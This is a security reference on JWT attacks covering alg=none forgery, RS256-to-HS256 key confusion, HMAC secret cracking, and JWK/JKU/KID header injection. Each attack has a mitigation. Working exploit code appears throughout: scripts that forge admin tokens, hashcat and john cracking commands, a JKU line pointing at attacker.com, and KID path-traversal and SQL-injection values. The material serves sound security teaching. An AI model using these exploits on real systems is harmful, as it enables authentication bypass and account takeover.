# JWT Attacks

JSON Web Token attacks target the implementation of JWT-based authentication and
authorization — usually the signing/verification logic, key management, or algorithm
confusion.

---

## Algorithm Confusion (alg=none)

**Category:** JWT Forgery
**Severity context:** Critical — forge arbitrary tokens if the server accepts unsigned JWTs.

### How to identify it
Capture a valid JWT from the target app. Decode its header (base64url-decode the first
segment) and look at the `alg` field. If it is `RS256` or `HS256`, test whether the
server accepts a modified token with `alg` set to `none`. Send a tampered JWT with
an empty signature.

### How it works
The JWT header declares which algorithm was used to sign the token. Some libraries
trust the header and pass the algorithm value directly into the verification function
without checking it against an expected allow-list. If `alg: none` is accepted, the
signature is simply ignored.

### Exploitation
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b"=").decode()
token = f"{header}.{payload}."
print(token)
```

```bash
# Resulting token (use in Authorization header)
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

# Some libraries also accept: None, NONE, none, nOnE
```

### Mitigation
Use a library that enforces an explicit allow-list of accepted algorithms. Never pass the
user-supplied `alg` header value directly into the verification call. Pin to `RS256` or
`ES256` and reject `none` outright.

### References
- [JWT.io: alg=none vulnerability](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [PortSwigger: JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)

---

## RS256 to HS256 Key Confusion

**Category:** JWT Forgery
**Severity context:** Critical — forge tokens with the server's own public key.

### How to identify it
Check the JWT header `alg` — if the server uses `RS256` (asymmetric), grab the public
key (often exposed at `/.well-known/jwks.json`, `/jwks`, or embedded in a `jwk` header).
Test if the server accepts a token signed with `HS256` using the public key as the
shared secret.

### How it works
RS256 signs with a private key and verifies with a public key. HS256 signs and verifies
with a single shared secret. If the verification code trusts the header's `alg` field
and passes the public key into an HMAC verification function, you can sign a token
using the public key as the HMAC secret — the server verifies it against the same
public key and accepts it.

### Exploitation
```python
import jwt

# Get the server's public key (e.g. from /jwks.json or .well-known/jwks.json)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Forge a token using the public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, public_key, algorithm="HS256")
print(token)
```

```bash
# Using jwcrypto or python-jose directly
python3 -c "
import jwt, sys
with open('public.pem') as f:
    key = f.read()
print(jwt.encode({'sub':'admin','role':'admin'}, key, algorithm='HS256'))
"
```

### Mitigation
Always use a fixed algorithm (usually `RS256`) and reject any token where the header
declares a different algorithm. Never use the public key for HMAC verification.

### References
- [PortSwigger: JWT algorithm confusion (RS256→HS256)](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [CVE-2015-9235 (jsonwebtoken)](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)

---

## Weak HMAC Secret / Brute-Force

**Category:** JWT Forgery
**Severity context:** High — recover the signing key offline and forge any token.

### How to identify it
If the JWT uses `HS256` (symmetric), the secret is the single point of failure. Capture
one valid JWT and attempt to crack the secret offline using a wordlist.

### How it works
HMAC-based JWTs are signed with a shared secret. If that secret is weak, you can brute-
force it offline by trying each candidate secret and checking if the signature matches.
Unlike password hashing, JWT signing is fast — millions of attempts per second.

### Exploitation
```bash
# Extract the JWT and use hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or use john
john --format=jwt jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt

# PyJWT crack script
python3 -c "
import jwt, sys
with open('jwt.txt') as f:
    token = f.read().strip()
with open('/usr/share/wordlists/rockyou.txt', errors='ignore') as wl:
    for word in wl:
        word = word.strip()
        try:
            payload = jwt.decode(token, word, algorithms=['HS256'])
            print(f'Secret found: {word}')
            print(payload)
            break
        except:
            pass
"
```

### Mitigation
Use asymmetric algorithms (`RS256`, `ES256`) whenever possible. If HMAC is required,
use a secret of at least 256 bits generated from a CSPRNG — never a human-memorable
password.

### References
- [hashcat JWT mode (-m 16500)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Crack JWT secrets](https://github.com/ticarpi/jwt_tool)

---

## JWK / JKU / KID Injection

**Category:** JWT Forgery
**Severity context:** Critical — inject an attacker-controlled public key.

### How to identify it
Examine the JWT header for fields other than `alg` and `typ`: `jwk` (embedded key),
`jku` (key URL), or `kid` (key ID). If any are present, the server may be fetching
or accepting key material from untrusted sources.

### How it works
- `jwk`: The header contains a full JSON Web Key. If the server trusts the embedded key,
  you can include your own public key and sign with your matching private key.
- `jku`: The header contains a URL to fetch the key. If the server fetches it without
  validation, point it at a key you control.
- `kid`: The header contains a key identifier. If this is used in SQL queries or
  filesystem lookups, it may be injectable (path traversal, SQLi).

### Exploitation
```python
# JWK injection — embed your own RSA public key
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import jwt, json, base64

# Generate a new RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Get public key components in JWK format
public_numbers = public_key.public_numbers()
n = base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
e = base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode()

jwk_header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "n": n,
        "e": e
    }
}

token = jwt.encode({"sub": "admin"}, private_key, algorithm="RS256", headers=jwk_header)
print(token)
```

```bash
# JKU injection — host your JWK on a server you control
# Change jku header to: "jku": "http://attacker.com/jwks.json"
python3 jwt_tool.py <token> -X jku -ju http://attacker.com/jwks.json

# KID path traversal
# If KID is used as filename to load the key:
# "kid": "../../dev/null"     → empty key → HMAC with empty secret
# "kid": ../../etc/passwd"    → file content as key
# SQLi in kid (Node.js/MySQL):
# "kid": "key' UNION SELECT 'hmac_key' -- "
```

### Mitigation
Pin allowed JWK URLs (fewer, static). Do not embed keys from the header. Validate JKU
against an allow-list. Treat KID as an opaque string — do not use it in filesystem or
database lookups.

### References
- [PortSwigger: JWT header injections](https://portswigger.net/web-security/jwt)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
